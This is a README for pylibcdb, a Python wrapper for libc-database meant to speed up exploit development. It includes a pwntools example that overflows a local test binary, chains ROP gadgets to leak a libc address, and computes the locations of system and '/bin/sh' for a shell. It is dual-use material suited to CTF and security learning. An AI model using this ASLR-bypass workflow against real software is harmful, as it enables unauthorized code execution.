# pylibcdb

pylibcdb is a python>=3.7 [libc_database](https://github.com/niklasb/libc-database) wrapper, its purpose is to improve exploit development tasks like ASLR bypass with an unknown libc.

With time i'd like to add more features and automated useful functions, for now this is the basic version.

### Requirements

There aren't python dependeces for now, but you need to install [libc_database](https://github.com/niklasb/libc-database) locally.

### Context

- x86_64 Linux

### Installation
```bash
git clone https://github.com/Neetx/pylibcdb
cd pylibcdb
python setup.py install
```

### Basic usage

```python
from pylibcdb.LibcDB import LibcDB

libcdb = LibcDB("/path/to/your/libc-database")
libc_name = libcdb.find_by_address("0x7fe7ac9a7fc0", symbol="__libc_start_main") #leaked __libc_start_main is default for symbol
print(libc_name)
libc_path = libcdb.download_by_name(libc_name)
print(libc_path)
```

```
libc6_2.31-0ubuntu9.1_amd64
/path/to/your/libc-database/libs/libc6_2.31-0ubuntu9.1_amd64/libc-2.31.so
```
This .so can be easily analyzed (or used with [pwntools](https://github.com/Gallopsled/pwntools) ELF()) to discovery function addresses and build a ROP chain.
In this way there's no need to launch "find" and "download" scripts manually with several copy-paste.

#### A more detailed example

```python
from pwn import *
from pylibcdb.LibcDB import LibcDB

p = process("./vuln_test")
elf = ELF("./vuln_test")
rop = ROP(elf)

puts = elf.plt['puts']
main = elf.symbol['main']
libc_start_main = elf.symbols['__libc_start_main']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

base_payload = "A"*32 + "B"*8    #this must change for every target binary
rop = base_payload.encode() + p64(pop_rdi) + p64(libc_start_main) + p64(puts) + p64(main)

p.sendline(rop)   #this sending and receiving changes for every target binary
received = p.recvline().strip()
leak = u64(received.ljust(8, "\x00".encode()))

libcdb = LibcDB("/path/to/your/libc-database")
libc_name = libcdb.find_by_address(leak, symbol="__libc_start_main") #leaked __libc_start_main is default for symbol
libc_path = libcdb.download_by_name(libc_name)

libc = ELF(libc_path)
libc.address = leak - libc.sym["__libc_start_main"]

binsh = next(libc.search("/bin/sh".encode()))
system = libc.sym["system"]
```

At this point we have all we need to craft a final ROP chain and get shell. This is a workflow example in facts things may (sure) change for each scenario, but the idea is to not let target binary crashes and not stop the exploit execution to launch libc-database scripts manually.

Later I will release a complete and working example with a vulnerable binary.

#### Scripts
Without this library you have to launch:
```
./find __libc_start_main LEAKED_ADDRESS
./download LIBC_NAME_OUTPUT
```
And then you have to copy the shared object to your working directory or to use its absolute path.

### Contacts

[neetx](neetx@protonmail.com)

### License

Copyright 2020 Neetx

This file is part of pylibcdb.

pylibcdb is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

pylibcdb is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with pylibcdb.  If not, see <http://www.gnu.org/licenses/>.